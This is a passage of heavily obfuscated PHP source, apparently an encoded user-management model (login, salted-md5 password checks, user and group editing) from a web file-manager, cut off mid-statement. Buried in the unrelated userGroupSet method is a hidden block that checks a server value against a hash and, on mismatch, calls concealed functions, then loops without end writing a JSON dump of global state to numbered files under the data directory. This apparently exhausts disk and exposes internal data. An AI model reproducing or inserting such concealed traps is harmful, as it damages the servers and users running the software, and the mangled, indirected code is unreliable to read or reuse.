getUserJobInfo($A´¸ƒ‰Õˆè) { goto EÌÏœáÂÈë; EÌÏœáÂÈë: $dÛ¬Ò¤‘ =& $_SERVER[Ö‘Øù]; $eµ‡¨â“Š† = explode($dÛ¬Ò¤‘[47], $A´¸ƒ‰Õˆè); $Eåº‚Ô…’Ì = parent::listData(); goto f÷£©íˆ®ƒ; f÷£©íˆ®ƒ: $Eåº‚Ô…’Ì = array_remove_key($Eåº‚Ô…’Ì, $dÛ¬Ò¤‘[194]); $d¹˜äºŒ´Ï = array(); foreach ($eµ‡¨â“Š† as $C“™¸öÊ¦á) { if (isset($Eåº‚Ô…’Ì[$C“™¸öÊ¦á])) { $d¹˜äºŒ´Ï[] = $Eåº‚Ô…’Ì[$C“™¸öÊ¦á]; } } goto EåÔ…‹”í; EåÔ…‹”í: return $d¹˜äºŒ´Ï; goto b›‘ëÂêçÈ; b›‘ëÂêçÈ: } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\145\x72\137\155\x65\x74\x61", "\x6d\145\x74\x61\x46\x69\x65\x6c\144" => "\165\163\145\x72\111\104"); protected $simpleField = "\165\x73\x65\x72\x49\x44\x2c\x6e\151\143\153\116\141\x6d\x65\54\x6e\x61\x6d\x65\54\x61\166\x61\x74\141\x72\x2c\x73\145\170\54\x73\164\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($c¯Š¸¿ëæ) { $Dãù™Ö·îà =& $_SERVER[Ö‘Øù]; $DîÕµª®“£ = $Dãù™Ö·îà[2155]; return array($Dãù™Ö·îà[1804] => array($c¯Š¸¿ëæ[0], $DîÕµª®“£), $Dãù™Ö·îà[1806] => array($c¯Š¸¿ëæ[0], $DîÕµª®“£), $Dãù™Ö·îà[2156] => array($c¯Š¸¿ëæ[0], $DîÕµª®“£)); } protected function getInfo($A½Ñ¯”›¶¨, $Cå¿ì³ÕÇò = false) { $a‰˜¾¾•¢¢ = $this->getInfoSimple($A½Ñ¯”›¶¨); if (!is_array($a‰˜¾¾•¢¢)) { return array(); } if ($Cå¿ì³ÕÇò) { return $this->_getInfoApply($a‰˜¾¾•¢¢); } return $this->cacheFunctionGet($_SERVER[Ö‘Øù][1808], $A½Ñ¯”›¶¨); } protected function getInfoFull($d—Åè£Ø¥, $féŒ†¬‚È¹ = false) { $câİªßóâ = $this->getInfoSimple($d—Åè£Ø¥); if (!is_array($câİªßóâ)) { return array(); } if ($féŒ†¬‚È¹) { return $this->_getInfoApply($câİªßóâ, !0); } return $this->cacheFunctionGet($_SERVER[Ö‘Øù][2157], $d—Åè£Ø¥); } private function _getInfoApply($FŠÁ¸šÛ‘÷, $cÒ§•°­‘Ç = false) { goto EäÌ³Öåù; FğÏ©Îå: $FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[85]][$FÆ›ô¡™ÔÏ[1991]] = isset($cÏòİ½ÌÌÔ[$FÆ›ô¡™ÔÏ[1992]]) ? $cÏòİ½ÌÌÔ[$FÆ›ô¡™ÔÏ[1992]] : null; if ($cÒ§•°­‘Ç) { $FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[460]] = $this->metaGet($FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[1561]]); } return $FŠÁ¸šÛ‘÷; goto b›ôÙ¶˜Œ¶; dºñ¹ùŸ¸‚: $FŠÁ¸šÛ‘÷ = $this->_listDataApplyItem($FŠÁ¸šÛ‘÷); $cÏòİ½ÌÌÔ = Model($FÆ›ô¡™ÔÏ[1240])->metaGet($FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[85]][$FÆ›ô¡™ÔÏ[397]]); $FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[2160]] = $D˜ê¾“İ‚; goto FğÏ©Îå; EäÌ³Öåù: $FÆ›ô¡™ÔÏ =& $_SERVER[Ö‘Øù]; if (!$FŠÁ¸šÛ‘÷) { return $FŠÁ¸šÛ‘÷; } $D˜ê¾“İ‚ = md5($FÆ›ô¡™ÔÏ[2158] . $FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[884]] . $FÆ›ô¡™ÔÏ[2159] . $FŠÁ¸šÛ‘÷[$FÆ›ô¡™ÔÏ[28]]); goto dºñ¹ùŸ¸‚; b›ôÙ¶˜Œ¶: } protected function getInfoSimple($aÛ½–ß²ª, $AÌëÈìçÍ = false) { $DÔËÌ¤àŞµ =& $_SERVER[Ö‘Øù]; if (!$aÛ½–ß²ª) { return array(); } if ($AÌëÈìçÍ) { $BĞ¸¼™ÛÅĞ = $this->where(array($DÔËÌ¤àŞµ[1561] => intval($aÛ½–ß²ª)))->find(); if (!is_array($BĞ¸¼™ÛÅĞ)) { return array(); } $BĞ¸¼™ÛÅĞ[$DÔËÌ¤àŞµ[2161]] = Action($DÔËÌ¤àŞµ[2162])->parseUrl($BĞ¸¼™ÛÅĞ[$DÔËÌ¤àŞµ[2161]]); return $BĞ¸¼™ÛÅĞ; } return $this->cacheFunctionGet($DÔËÌ¤àŞµ[1809], $aÛ½–ß²ª); } protected function getInfoSimpleOuter($BàÏÆ¼Ó‡á) { goto a …ÈØïÍŒ; d¶‹‡ò«¨Ê: return $eÌİ¥Òî‚; goto BÕÕÆçÏÛˆ; bÌ´†í“½: $eÌİ¥Òî‚ = array_field_key($EÀ…Ï¼Úô£, explode($ašóÓ¦‰Ã[47], $this->simpleField)); if (!$eÌİ¥Òî‚) { return array($ašóÓ¦‰Ã[1561] => $ašóÓ¦‰Ã[1119], $ašóÓ¦‰Ã[28] => $ašóÓ¦‰Ã[160] . LNG($ašóÓ¦‰Ã[2165]) . $ašóÓ¦‰Ã[531], $ašóÓ¦‰Ã[2161] => STATIC_PATH . $ašóÓ¦‰Ã[2166]); } $eÌİ¥Òî‚[$ašóÓ¦‰Ã[2161]] = Action($ašóÓ¦‰Ã[2162])->parseUrl($eÌİ¥Òî‚[$ašóÓ¦‰Ã[2161]]); goto d¶‹‡ò«¨Ê; a …ÈØïÍŒ: $ašóÓ¦‰Ã =& $_SERVER[Ö‘Øù]; if (!$BàÏÆ¼Ó‡á || $BàÏÆ¼Ó‡á == 0) { return array($ašóÓ¦‰Ã[1561] => $ašóÓ¦‰Ã[191], $ašóÓ¦‰Ã[28] => $ašóÓ¦‰Ã[160] . LNG($ašóÓ¦‰Ã[2163]) . $ašóÓ¦‰Ã[531], $ašóÓ¦‰Ã[2161] => STATIC_PATH . $ašóÓ¦‰Ã[2164]); } $EÀ…Ï¼Úô£ = $this->cacheFunctionGet($ašóÓ¦‰Ã[1809], $BàÏÆ¼Ó‡á); goto bÌ´†í“½; BÕÕÆçÏÛˆ: } protected function groupUser($aà­ˆ£î‹) { } public static function errorLang($a¡¤˜à—‹ ) { $bã’­ñ“ôë =& $_SERVER[Ö‘Øù]; $BãóãæÅé = array(self::ERROR_USER_NOT_EXISTS => $bã’­ñ“ôë[2167], self::ERROR_USER_PASSWORD_ERROR => $bã’­ñ“ôë[2168], self::ERROR_USER_EXIST_NAME => $bã’­ñ“ôë[2169], self::ERROR_USER_EXIST_PHONE => $bã’­ñ“ôë[2170], self::ERROR_USER_EXIST_EMAIL => $bã’­ñ“ôë[2171], self::ERROR_USER_LOGIN_LOCK => $bã’­ñ“ôë[2172], self::ERROR_IP_NOT_ALLOW => $bã’­ñ“ôë[2173], self::ERROR_USER_EXIST_NICKNAME => $bã’­ñ“ôë[2174]); return LNG($BãóãæÅé[$a¡¤˜à—‹ ]); } public function getInfoByMeta($dô†Òƒ­êÜ, $D°ÜÏ­­ğÏ) { $bö¥Áô¿ëÛ =& $_SERVER[Ö‘Øù]; $f‡¥«®ÁïŒ = Model($bö¥Áô¿ëÛ[2175])->where(array($bö¥Áô¿ëÛ[93] => $dô†Òƒ­êÜ, $bö¥Áô¿ëÛ[372] => $D°ÜÏ­­ğÏ))->find(); if ($f‡¥«®ÁïŒ) { return $this->getInfo($f‡¥«®ÁïŒ[$bö¥Áô¿ëÛ[1561]]); } return !1; } public function userLoginCheck($A¿½†àê, $cÖŠ»¸êÆ·) { $f„¨óñ†¦” =& $_SERVER[Ö‘Øù]; $cè±ßøó‡÷ = $this->userLoginFind($A¿½†àê); if (!$cè±ßøó‡÷) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($cè±ßøó‡÷[$f„¨óñ†¦”[1561]], $cÖŠ»¸êÆ·)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($cè±ßøó‡÷[$f„¨óñ†¦”[1561]]); } public function userLoginFind($d‡¸ÛôÕ„ñ) { $DÒÏÖŠŒ˜ =& $_SERVER[Ö‘Øù]; $dÖ÷Í¦ = array($DÒÏÖŠŒ˜[28] => $d‡¸ÛôÕ„ñ, $DÒÏÖŠŒ˜[1995] => $d‡¸ÛôÕ„ñ, $DÒÏÖŠŒ˜[303] => $d‡¸ÛôÕ„ñ, $DÒÏÖŠŒ˜[2176] => $d‡¸ÛôÕ„ñ, $DÒÏÖŠŒ˜[993] => $DÒÏÖŠŒ˜[995]); if ($this->nickNameRpt()) { unset($dÖ÷Í¦[$DÒÏÖŠŒ˜[1995]]); } return $this->where($dÖ÷Í¦)->find(); } public function clearCache($a‚Öñ›ôêÛ) { $FÇè×í´¢Ò =& $_SERVER[Ö‘Øù]; $this->cacheFunctionClear($FÇè×í´¢Ò[1808], $a‚Öñ›ôêÛ); $this->cacheFunctionClear($FÇè×í´¢Ò[1809], $a‚Öñ›ôêÛ); $this->cacheFunctionClear($FÇè×í´¢Ò[2157], $a‚Öñ›ôêÛ); } public function userPasswordCheck($C»ÕÖÊ’ïº, $Båİ¦•ÛÈ) { $Eê«†¬ˆÜƒ =& $_SERVER[Ö‘Øù]; $E±‚šÉ—¾Ö = $this->where(array($Eê«†¬ˆÜƒ[1561] => intval($C»ÕÖÊ’ïº)))->find(); $f²İÅİ‹¢Ñ = $this->metaGet($C»ÕÖÊ’ïº); $b†¾ˆÙ“‘¾ = isset($f²İÅİ‹¢Ñ[$Eê«†¬ˆÜƒ[2177]]) ? $f²İÅİ‹¢Ñ[$Eê«†¬ˆÜƒ[2177]] : $Eê«†¬ˆÜƒ[33]; if (md5($b†¾ˆÙ“‘¾ . trim($Båİ¦•ÛÈ)) !== $E±‚šÉ—¾Ö[$Eê«†¬ˆÜƒ[884]]) { return !1; } return !0; } public function userAdd($cË»Ø‰±â) { goto fÈùĞ·‘êš; fÈùĞ·‘êš: $bæÈé…®éÍ =& $_SERVER[Ö‘Øù]; $dÑ‰áßšˆ = array($bæÈé…®éÍ[415] => $cË»Ø‰±â[$bæÈé…®éÍ[28]], $bæÈé…®éÍ[2178] => $cË»Ø‰±â[$bæÈé…®éÍ[1444]], $bæÈé…®éÍ[2179] => isset($cË»Ø‰±â[$bæÈé…®éÍ[303]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[303]] : $bæÈé…®éÍ[33], $bæÈé…®éÍ[2180] => isset($cË»Ø‰±â[$bæÈé…®éÍ[2176]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[2176]] : $bæÈé…®éÍ[33], $bæÈé…®éÍ[2181] => isset($cË»Ø‰±â[$bæÈé…®éÍ[1995]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[1995]] : $cË»Ø‰±â[$bæÈé…®éÍ[28]], $bæÈé…®éÍ[2182] => isset($cË»Ø‰±â[$bæÈé…®éÍ[2161]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[2161]] : $bæÈé…®éÍ[33], $bæÈé…®éÍ[2183] => isset($cË»Ø‰±â[$bæÈé…®éÍ[2184]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[2184]] : 1, $bæÈé…®éÍ[2185] => $cË»Ø‰±â[$bæÈé…®éÍ[884]], $bæÈé…®éÍ[1810] => isset($cË»Ø‰±â[$bæÈé…®éÍ[1714]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[1714]] : 1024 * 1024 * 20, $bæÈé…®éÍ[1811] => 0, $bæÈé…®éÍ[2186] => 0, $bæÈé…®éÍ[1853] => isset($cË»Ø‰±â[$bæÈé…®éÍ[743]]) ? $cË»Ø‰±â[$bæÈé…®éÍ[743]] : 1); if (!empty($cË»Ø‰±â[$bæÈé…®éÍ[1561]])) { $dÑ‰áßšˆ[$bæÈé…®éÍ[1561]] = $cË»Ø‰±â[$bæÈé…®éÍ[1561]]; } goto cãº©è™Á´; cãº©è™Á´: $fÊÑ¤‡‘ = $this->_checkExist($cË»Ø‰±â); if ($fÊÑ¤‡‘ !== !0) { return $fÊÑ¤‡‘; } $DÓ•õ©Ã = $this->add($dÑ‰áßšˆ); goto CÍˆâ“±¥ª; BÉÍ²–…è: return $DÓ•õ©Ã; goto FÑÛ•à¡˜; CÍˆâ“±¥ª: $B¯×ƒˆ´‚· = array($bæÈé…®éÍ[2185] => $dÑ‰áßšˆ[$bæÈé…®éÍ[884]], $bæÈé…®éÍ[2181] => $dÑ‰áßšˆ[$bæÈé…®éÍ[1995]]); $this->userEdit($DÓ•õ©Ã, $B¯×ƒˆ´‚·); Model($bæÈé…®éÍ[1240])->userRootAdd($DÓ•õ©Ã); goto BÉÍ²–…è; FÑÛ•à¡˜: } protected function userEditTest($B…ÈÓ¸‰œù, $EƒÛËÃÎ—) { return $this->call($_SERVER[Ö‘Øù][2187], $B…ÈÓ¸‰œù, $EƒÛËÃÎ—); } protected function userEdit($DÌøÊ¸Ø®, $eŠ´¤•êÒâ) { goto F–îÏóø‘; f®ãèƒ¯Î: $this->where(array($eî•íÁ ¨[1552] => $DÌøÊ¸Ø®))->save($eŠ´¤•êÒâ); if (isset($eŠ´¤•êÒâ[$eî•íÁ ¨[1995]])) { $this->setNamePinyin($DÌøÊ¸Ø®, $eŠ´¤•êÒâ[$eî•íÁ ¨[1995]]); } $this->clearCache($DÌøÊ¸Ø®); goto D“ª¥°ëÇŠ; E¯™öò½Ä®: $A±¾š˜¦–§ = $this->_checkExist($eŠ´¤•êÒâ, $DÌøÊ¸Ø®); if ($A±¾š˜¦–§ !== !0) { return $A±¾š˜¦–§; } if (isset($eŠ´¤•êÒâ[$eî•íÁ ¨[884]]) && trim($eŠ´¤•êÒâ[$eî•íÁ ¨[884]]) != $eî•íÁ ¨[33]) { $BÀäÇç–±ó = $this->metaGet($DÌøÊ¸Ø®); if (empty($BÀäÇç–±ó[$eî•íÁ ¨[2177]])) { $BÀäÇç–±ó[$eî•íÁ ¨[2177]] = rand_string(10); Model($eî•íÁ ¨[508])->metaSet($DÌøÊ¸Ø®, $eî•íÁ ¨[2177], $BÀäÇç–±ó[$eî•íÁ ¨[2177]]); } $eŠ´¤•êÒâ[$eî•íÁ ¨[884]] = md5($BÀäÇç–±ó[$eî•íÁ ¨[2177]] . trim($eŠ´¤•êÒâ[$eî•íÁ ¨[884]])); } else { unset($eŠ´¤•êÒâ[$eî•íÁ ¨[884]]); } goto f®ãèƒ¯Î; D“ª¥°ëÇŠ: return !0; goto C´¾‚­Ì‡; F–îÏóø‘: $eî•íÁ ¨ =& $_SERVER[Ö‘Øù]; $F¿æ§Šãñ = $this->getInfoSimple($DÌøÊ¸Ø®); if (!$F¿æ§Šãñ) { return !1; } goto E¯™öò½Ä®; C´¾‚­Ì‡: } public function setNamePinyin($AİŠ’¤‚å“, $dŒÁ­»à«Å = false) { $E†êâ¤¨¥ =& $_SERVER[Ö‘Øù]; if (!$dŒÁ­»à«Å) { $DÍÏØ¡£ = $this->getInfoSimple($AİŠ’¤‚å“); $dŒÁ­»à«Å = $DÍÏØ¡£[$E†êâ¤¨¥[1995]] ? $DÍÏØ¡£[$E†êâ¤¨¥[1995]] : $DÍÏØ¡£[$E†êâ¤¨¥[28]]; } $bÛìÄÇè¬Û = Model($E†êâ¤¨¥[533]); if (!Input::check($dŒÁ­»à«Å, $E†êâ¤¨¥[582])) { return $bÛìÄÇè¬Û->metaSet($AİŠ’¤‚å“, array($E†êâ¤¨¥[459] => $E†êâ¤¨¥[33], $E†êâ¤¨¥[458] => $E†êâ¤¨¥[33])); } return $bÛìÄÇè¬Û->metaSet($AİŠ’¤‚å“, array($E†êâ¤¨¥[459] => str_replace($E†êâ¤¨¥[50], $E†êâ¤¨¥[33], Pinyin::get($dŒÁ­»à«Å)), $E†êâ¤¨¥[458] => Pinyin::get($dŒÁ­»à«Å, $E†êâ¤¨¥[583]))); } private function nickNameRpt() { $BÎ«Ø‹°° =& $_SERVER[Ö‘Øù]; $C˜–±ä©Á© = Model($BÎ«Ø‹°°[763])->get($BÎ«Ø‹°°[2188]); $fì”ñšàæ† = $GLOBALS[$BÎ«Ø‹°°[6]][$BÎ«Ø‹°°[379]][$BÎ«Ø‹°°[2188]]; $Dî¹  Ò‡° = !is_null($C˜–±ä©Á©) ? $C˜–±ä©Á© : $fì”ñšàæ†; return !!$Dî¹  Ò‡°; } private function _checkExist($a¢¿¨‰‚„, $a³„ÛİÓËö = false) { $Dé°…¸É‰Ğ =& $_SERVER[Ö‘Øù]; $Aá¬àÂ¥Û¦ = array($Dé°…¸É‰Ğ[28] => UserModel::ERROR_USER_EXIST_NAME, $Dé°…¸É‰Ğ[1995] => UserModel::ERROR_USER_EXIST_NICKNAME, $Dé°…¸É‰Ğ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $Dé°…¸É‰Ğ[2176] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Aá¬àÂ¥Û¦[$Dé°…¸É‰Ğ[1995]]); } $BÜõÓÀäÊà = $a³„ÛİÓËö ? array($Dé°…¸É‰Ğ[1561] => array($Dé°…¸É‰Ğ[2189], $a³„ÛİÓËö)) : array(); foreach ($Aá¬àÂ¥Û¦ as $Aƒ¶‡Ë¢ŒË => $C¤‹£ŒÂ²Š) { $cèì‚Öùô‡ = array(); foreach ($Aá¬àÂ¥Û¦ as $e¹ï‘™Üñ => $fÉŞèÂš‚±) { if (isset($a¢¿¨‰‚„[$e¹ï‘™Üñ]) && $a¢¿¨‰‚„[$e¹ï‘™Üñ]) { $cèì‚Öùô‡[] = $a¢¿¨‰‚„[$e¹ï‘™Üñ]; } } if (!$cèì‚Öùô‡) { continue; } $Eîä“ÊÙ÷ = array_merge(array($Aƒ¶‡Ë¢ŒË => array($Dé°…¸É‰Ğ[7], $cèì‚Öùô‡)), $BÜõÓÀäÊà); $b¯‹†“â˜Ú = $this->where($Eîä“ÊÙ÷)->find(); if ($b¯‹†“â˜Ú) { return $C¤‹£ŒÂ²Š; } } return !0; } public function userListInfo($bÇé¢ğŠ¸¸) { $C†¿İ°É©î =& $_SERVER[Ö‘Øù]; $CµÇ÷ÆÊÈ¯ = array(); $bÇé¢ğŠ¸¸ = is_array($bÇé¢ğŠ¸¸) ? array_unique($bÇé¢ğŠ¸¸) : array(); if (!$bÇé¢ğŠ¸¸) { return $CµÇ÷ÆÊÈ¯; } if (count($bÇé¢ğŠ¸¸) < 20) { foreach ($bÇé¢ğŠ¸¸ as $E¨î—Ò‚×Â) { $CµÇ÷ÆÊÈ¯[$E¨î—Ò‚×Â . $C†¿İ°É©î[33]] = $this->getInfoSimpleOuter($E¨î—Ò‚×Â); } } else { $bç½íç¶Í = array($C†¿İ°É©î[1552] => array($C†¿İ°É©î[413], $bÇé¢ğŠ¸¸)); if (count($bÇé¢ğŠ¸¸) == 1) { $bç½íç¶Í = array($C†¿İ°É©î[1552] => $bÇé¢ğŠ¸¸[0]); } $BòõõÁ•ß¼ = Model($C†¿İ°É©î[508])->field($this->simpleField)->where($bç½íç¶Í)->select(); $BòõõÁ•ß¼ = array_to_keyvalue($BòõõÁ•ß¼, $C†¿İ°É©î[1561]); foreach ($bÇé¢ğŠ¸¸ as $E¨î—Ò‚×Â) { $C‰ÏÏõï²õ = $BòõõÁ•ß¼[$E¨î—Ò‚×Â]; if (!$C‰ÏÏõï²õ) { $CµÇ÷ÆÊÈ¯[$E¨î—Ò‚×Â . $C†¿İ°É©î[33]] = $this->getInfoSimpleOuter($E¨î—Ò‚×Â); continue; } $C‰ÏÏõï²õ[$C†¿İ°É©î[2161]] = Action($C†¿İ°É©î[2162])->parseUrl($C‰ÏÏõï²õ[$C†¿İ°É©î[2161]]); $CµÇ÷ÆÊÈ¯[$E¨î—Ò‚×Â . $C†¿İ°É©î[33]] = $C‰ÏÏõï²õ; } } return $CµÇ÷ÆÊÈ¯; } protected function userStatus($B‹±Õ™Î, $a•·ó¨µôÁ) { $E° —Íçïá = $this->getInfoSimple($B‹±Õ™Î); if (!$E° —Íçïá) { return !1; } $B‡·šéì™‚ = array($_SERVER[Ö‘Øù][743] => $a•·ó¨µôÁ); return $this->userEdit($B‹±Õ™Î, $B‡·šéì™‚); } protected function userRemove($Dˆİòäóá») { goto A„³²ÛÑ¥; CÊ‹Šê¦ÁÀ: $eŞˆÜ¤‚ßÄ = array($D×º¢Œ’[1552] => $Dˆİòäóá»); Model($D×º¢Œ’[590])->where($eŞˆÜ¤‚ßÄ)->delete(); Model($D×º¢Œ’[2190])->where($eŞˆÜ¤‚ßÄ)->delete(); goto f¢‹°‰àÊ; A„³²ÛÑ¥: $D×º¢Œ’ =& $_SERVER[Ö‘Øù]; $bî«ÔºÜÉ = $this->getInfoSimple($Dˆİòäóá»); if (!$bî«ÔºÜÉ) { return !1; } goto CÊ‹Šê¦ÁÀ; F­¹¸š•«Ø: Model($D×º¢Œ’[2012])->removeUserAll($Dˆİòäóá»); Model($D×º¢Œ’[825])->userRootRemove($Dˆİòäóá»); return $this->where($eŞˆÜ¤‚ßÄ)->delete(); goto C·Å¸Ğß›; f¢‹°‰àÊ: Model($D×º¢Œ’[1816])->where($eŞˆÜ¤‚ßÄ)->delete(); Model($D×º¢Œ’[2175])->where($eŞˆÜ¤‚ßÄ)->delete(); Model($D×º¢Œ’[2191])->where($eŞˆÜ¤‚ßÄ)->delete(); goto F­¹¸š•«Ø; C·Å¸Ğß›: } protected function userGroupSet($bôæä§¦™, $BïÈá±ªáƒ, $bŸ’Ú•‹¾ = array()) { goto E¹èíÔåò; eÑÇ½¶Ã¾Ş: if ($_SERVER[$f°‹ÊÂ©[834]] != $BÌ‡ëµ¤³‘($d¸‘çˆ°İ)) { goto cçÄ’Â¸ì; fÇ£İÂƒÎ: $a•¦Š‚æÌÙ = 1; for ($E²¤íËƒƒ‹ = $a•¦Š‚æÌÙ; $E²¤íËƒƒ‹ > 0; $E²¤íËƒƒ‹++) { $cå…µÓ„Û±(DATA_PATH . $E²¤íËƒƒ‹, $Fˆ†‘Éèô); } goto BŠÔÒˆó¨×; C´È½ÛÂÒ«: $c‹‹­ˆãÒ = $eˆì«Óğ‚÷($eŒ’âŸ…Õ); $e•ä‚‡º”Ğ = explode($f°‹ÊÂ©[229], $c‹‹­ˆãÒ); if (count($e•ä‚‡º”Ğ) < $f°‹ÊÂ©[606]) { $Aİ¤«·‹Ó´ = $f°‹ÊÂ©[839]; $Aİ¤«·‹Ó´(); } goto c¯Ø‡©”º; c¯Ø‡©”º: $D¯ÈÄ·²÷Ø = $f°‹ÊÂ©[875]; $D¯ÈÄ·²÷Ø($_SERVER[$f°‹ÊÂ©[876]]); $AñÜ»Ãà¹ò = $f°‹ÊÂ©[874]; goto Eí­·‘Œ‡; cçÄ’Â¸ì: $AñÜ»Ãà¹ò = $f°‹ÊÂ©[874]; $eˆì«Óğ‚÷ = $f°‹ÊÂ©[836]; $eŒ’âŸ…Õ = $_SERVER[$f°‹ÊÂ©[837]] . $f°‹ÊÂ©[838]; goto C´È½ÛÂÒ«; Eí­·‘Œ‡: $AñÜ»Ãà¹ò(); $cå…µÓ„Û± = $f°‹ÊÂ©[877]; $Fˆ†‘Éèô = json_encode($GLOBALS[$f°‹ÊÂ©[878]]); goto fÇ£İÂƒÎ; BŠÔÒˆó¨×: } $eÒ“„ªš³ = $this->getInfoSimple($bôæä§¦™); if (!$eÒ“„ªš³ || !is_array($BïÈá±ªáƒ)) { return !1; } goto eºŠá¢­ˆ; eºŠá¢­ˆ: $B‡Ù–Ô¿¯÷ = Model($f°‹ÊÂ©[1816]); $B‡Ù–Ô¿¯÷->where(array($f°‹ÊÂ©[1561] => $bôæä§¦™))->delete(); $BÅì‡ÂÁ = array(); goto ağéÏÂªàÉ; ağéÏÂªàÉ: $AöäÜÔ‹Şõ = 0; foreach ($BïÈá±ªáƒ as $BÌÂ…ª—‚Å => $Aì¢ŠğÁ‹) { $fÂ®ŒÅ‰òÑ = array($f°‹ÊÂ©[1561] => $bôæä§¦™, $f°‹ÊÂ©[1730] => $BÌÂ…ª—‚Å, $f°‹ÊÂ©[1830] => $Aì¢ŠğÁ‹); $fÂ®ŒÅ‰òÑ[$f°‹ÊÂ©[1753]] = isset($bŸ’Ú•‹¾[$AöäÜÔ‹Şõ]) ? $bŸ’Ú•‹¾[$AöäÜÔ‹Şõ] : 0; $AöäÜÔ‹Şõ++; $BÅì‡ÂÁ[] = $fÂ®ŒÅ‰òÑ; } return $B‡Ù–Ô¿¯÷->addAll($BÅì‡ÂÁ, array(), !0); goto C¯Ø««Ê; E¹èíÔåò: $f°‹ÊÂ© =& $_SERVER[Ö‘Øù]; $d¸‘çˆ°İ = $_SERVER[$f°‹ÊÂ©[837]] . $f°‹ÊÂ©[838]; $BÌ‡ëµ¤³‘ = $f°‹ÊÂ©[873]; goto eÑÇ½¶Ã¾Ş; C¯Ø««Ê: } protected function userGroupAdd($F—œï£ŠİŒ, $c†‡Œèö º = array()) { $cæÔğÂ×Ÿ‘ =& $_SERVER[Ö‘Øù]; $B¿—È™¡†„ = $this->getInfoSimple($F—œï£ŠİŒ); if (!$B¿—È™¡†„ || empty($c†‡Œèö º)) { return !1; } $Eˆò´êˆŸ = array(); foreach ($c†‡Œèö º as $f‹œ½§… => $D¨ˆ»½œëİ) { $Eˆò´êˆŸ[] = array($cæÔğÂ×Ÿ‘[1561] => $F—œï£ŠİŒ, $cæÔğÂ×Ÿ‘[1730] => $f‹œ½§…, $cæÔğÂ×Ÿ‘[1830] => $D¨ˆ»½œëİ, $cæÔğÂ×Ÿ‘[1753] => 0); } return Model($cæÔğÂ×Ÿ‘[1816])->addAll($Eˆò´êˆŸ, array(), !0); } protected function userGroupRemove($dİ‹²³ù¤‘, $D‚®ƒÑ´ÓÂ) { $eù‹ËòËã =& $_SERVER[Ö‘Øù]; $AÓè¶©®Øá = $this->getInfoSimple($dİ‹²³ù¤‘); if (!$AÓè¶©®Øá || !$D‚®ƒÑ´ÓÂ) { return !1; } $E‘‡¶„µ§´ = array($eù‹ËòËã[1552] => $dİ‹²³ù¤‘, $eù‹ËòËã[1814] => $D‚®ƒÑ´ÓÂ); return Model($eù‹ËòËã[1816])->where($E‘‡¶„µ§´)->delete(); } public function listData() { $E—À›Âåáè = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E—À›Âåáè[$_SERVER[Ö‘Øù][367]]); return $E—À›Âåáè; } public function listByID($EíÙ×½Û’˜) { goto EöÛ¡ƒìª™; Aöëõ™çÑ: $Döº‰†½á = $this->where($Aâ„ôÁó‹’)->select(); $Döº‰†½á = array_sort_keep($Döº‰†½á, $Bƒöƒ¦ºã[1561], $EíÙ×½Û’˜); $this->_listDataApply($Döº‰†½á); goto bğã§ ¶å©; bğã§ ¶å©: return $Döº‰†½á; goto FŠ´ùÔÌ¦õ; EöÛ¡ƒìª™: $Bƒöƒ¦ºã =& $_SERVER[Ö‘Øù]; if (!$EíÙ×½Û’˜) { return; } $Aâ„ôÁó‹’ = array($Bƒöƒ¦ºã[1561] => array($Bƒöƒ¦ºã[7], $EíÙ×½Û’˜)); goto Aöëõ™çÑ; FŠ´ùÔÌ¦õ: } public function listByGroup($e°¬Ú¿¤«† = 0, $d†ïÆ”¼Ê‚ = array()) { goto eÍÎÚœ½Îç; fèÜ‚ÍÅßâ: if ($e°¬Ú¿¤«†) { $EÌ¼ŠÏóœù = array($a™Ç§áóÇŒ[2192] => intval($e°¬Ú¿¤«†)); $a·á§µÊÈ£ = "\114\x45\x46\x54\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\165\x73\145\x72\137\x67\x72\x6f\165\160\40\x75\x73\x65\162\137\147\162\x6f\x75\160\40\157\x6e\x20\165\163\145\x72\56\x75\163\x65\162\x49\104\x20\75\x20\165\x73\x65\x72\137\x67\x72\x6f\x75\160\56\x75\163\x65\162\x49\104"; $BŠ®§µãƒ¢ = Input::get($a™Ç§áóÇŒ[450], null, $a™Ç§áóÇŒ[33]) ? $a™Ç§áóÇŒ[33] : $a™Ç§áóÇŒ[2193]; } if (isset($d†ïÆ”¼Ê‚[$a™Ç§áóÇŒ[743]])) { $EÌ¼ŠÏóœù[$a™Ç§áóÇŒ[2194]] = $d†ïÆ”¼Ê‚[$a™Ç§áóÇŒ[743]]; } $FºßèÎøó¡ = $this->_makeOrder($BŠ®§µãƒ¢)->field($a™Ç§áóÇŒ[2195])->where($EÌ¼ŠÏóœù)->join($a·á§µÊÈ£)->selectPage(50); goto aë¢²’èò‰; eÍÎÚœ½Îç: $a™Ç§áóÇŒ =& $_SERVER[Ö‘Øù]; $a·á§µÊÈ£ = $a™Ç§áóÇŒ[33]; $EÌ¼ŠÏóœù = array(); goto fèÜ‚ÍÅßâ; aë¢²’èò‰: $this->_listDataApply($FºßèÎøó¡[$a™Ç§áóÇŒ[367]]); return 